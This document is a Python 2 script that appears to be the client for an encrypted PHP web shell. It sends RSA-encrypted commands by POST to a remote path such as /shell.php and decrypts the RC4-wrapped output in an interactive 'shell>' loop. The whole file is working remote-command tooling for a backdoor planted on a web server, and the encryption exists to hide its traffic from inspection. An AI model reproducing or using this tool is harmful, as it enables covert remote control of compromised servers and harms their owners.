#!/usr/bin/python
import M2Crypto, httplib, urllib, sys, base64, binascii, os, re
from optparse import OptionParser

pub_key = M2Crypto.RSA.load_pub_key('./local/pub.key')
priv_key = M2Crypto.RSA.load_key('./local/priv.key')

def main():
###
#ARG PARSING!!!
###
	parser = OptionParser(usage="USAGE: %prog --host=127.0.0.1 --path=/shell.php", version= "%prog 1.0")
	
	parser.add_option("--host", dest="host",
		help="HOSTNAME should just be a hostname", metavar="HOSTNAME",
		action="store",
		default=True)
	parser.add_option("--path", dest="path",
		help="Path from root",
		action="store",
		default=True)
	(options, args) = parser.parse_args()
	if len(sys.argv) != 3:
		parser.error("Options are in the wrong format")
		usage()
	print "[*] Enter: \'/quit\' to quit"
	http_shell(options.host, options.path)
	sys.exit(0)

def usage():
	print "USAGE: ./shell.py --host=127.0.0.1 --path=/shell.php"

def pub_encrypt(key, cmd):
	encrypted = key.public_encrypt(cmd, M2Crypto.RSA.pkcs1_oaep_padding)
	encrypted = base64.b64encode(encrypted)
	return encrypted

def priv_decrypt(key, encrypted):
	plaintext=key.private_decrypt(encrypted, M2Crypto.RSA.pkcs1_oaep_padding)
	return plaintext

def post_cmd(password, cmd, host, location):
 	params = urllib.urlencode({'cmd':cmd, 'id':password})
	headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
	conn = httplib.HTTPConnection(host)
	conn.request("POST", location, params, headers)
	response=conn.getresponse()
	response=response.read()
	return response

def parse_data(data):
	data_split=data.split("<br />")
	cipher_envelope = base64.b64decode(data_split[0])
	data = base64.b64decode(data_split[1])
	return cipher_envelope, data

def decrypt_data(encrypt_envelope, data):
	decrypt_envelope = priv_key.private_decrypt(encrypt_envelope, M2Crypto.RSA.pkcs1_padding)
	rc4 = M2Crypto.RC4.RC4(decrypt_envelope)
	plaintext = rc4.update(data)
	return plaintext

def get_reason(data):
	if "undefined function openssl_private_decrypt()" in data:
		return "Webserver does not support OpenSSL"	
	
def http_shell(host, path):
	input=""
	#input=raw_input('\x1b[31mshell\x1b[0m\x1b[34m>\x1b[0m')
	while input != '/quit':

	        input=""
	        input=raw_input('\x1b[31mshell\x1b[0m\x1b[34m>\x1b[0m')
		
		if input== '/quit':
			sys.exit(0)
		password = os.urandom(24)
		cipherpass = pub_encrypt(pub_key, password) #encrypt password
		ciphertext = pub_encrypt(pub_key, input) #encrypt Input
		
		response = post_cmd(cipherpass, ciphertext, host, path) #post response
		
		#print response
	
		if len(response) < 20: # No Response Returned
			continue
		try:
			cipher_envelope, data = parse_data(response)
		except:
			print "[!] " + get_reason(response)
                        continue

		try:
			plain_text = decrypt_data(cipher_envelope, data)
		except:
                        print "[!] Something Went Wrong- Bad Keys Perhaps?"
			continue
			
		print plain_text

if __name__ == "__main__":
	main()
